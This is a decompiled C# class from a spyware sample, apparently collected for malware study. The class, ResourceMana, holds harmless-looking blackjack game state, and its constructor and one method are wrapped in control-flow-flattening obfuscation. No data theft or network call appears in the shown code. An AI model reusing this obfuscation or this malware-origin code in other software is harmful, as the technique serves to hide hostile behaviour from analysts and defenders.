// Decompiled with JetBrains decompiler
// Type: TOKENU.ResourceMana
// Assembly: UInt32ArrayTypeI, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2F94D963-B282-4BF6-A540-85D019D8F975
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcqa-e64990765a452d35a4b5e461940d547ab3e145dbdf2e3b4b282b12ed1eba308d.exe

using ISpon;
using SecurityPermissionAttrib;
using System.Collections.Generic;

namespace TOKENU
{
  public class ResourceMana : CreateFl
  {
    public int Bet { get; set; }

    public int Insurance { get; set; }

    internal List<Func> Hand1 { get; set; }

    internal List<Func> Hand2 { get; set; }

    public bool Hand1Flipped { get; set; }

    public bool Hand2Flipped { get; set; }

    public ResourceMana()
    {
    }

    public ResourceMana(
      string id,
      string UserName,
      int Balance,
      int WinStreak,
      int WinCount,
      int LoseCount,
      int Games,
      int Owing,
      double AvgBet,
      int MaxBet,
      int MinBet,
      string LastPlay,
      int CurrentStreak)
      : base(id, UserName, Balance, WinStreak, WinCount, LoseCount, Games, Owing, AvgBet, MaxBet, MinBet, LastPlay, CurrentStreak)
    {
label_1:
      int num1 = 2058255981;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 903905838)) % 9U)
        {
          case 0:
            num1 = (int) num2 * 1782290540 ^ -634340467;
            continue;
          case 1:
            this.Hand1 = new List<Func>();
            num1 = (int) num2 * 1180853076 ^ 764768775;
            continue;
          case 2:
            this.Bet = 0;
            this.Insurance = 0;
            num1 = (int) num2 * -963864362 ^ -1012389539;
            continue;
          case 3:
            goto label_1;
          case 4:
            num1 = (int) num2 * 1425032640 ^ -1575246611;
            continue;
          case 5:
            this.Hand2 = new List<Func>();
            this.Hand1Flipped = false;
            num1 = (int) num2 * 411622300 ^ 774109955;
            continue;
          case 7:
            num1 = (int) num2 * -1548348532 ^ -981479530;
            continue;
          case 8:
            num1 = (int) num2 * 404320648 ^ -1653606218;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      this.Hand2Flipped = false;
    }

    internal void AddHand1(Func Card) => this.Hand1.Add(Card);

    internal void AddHand2(Func Card)
    {
label_1:
      int num1 = -1806189816;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -981575964)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Hand2.Add(Card);
            num1 = (int) num2 * 1566449087 ^ -557927845;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }
  }
}
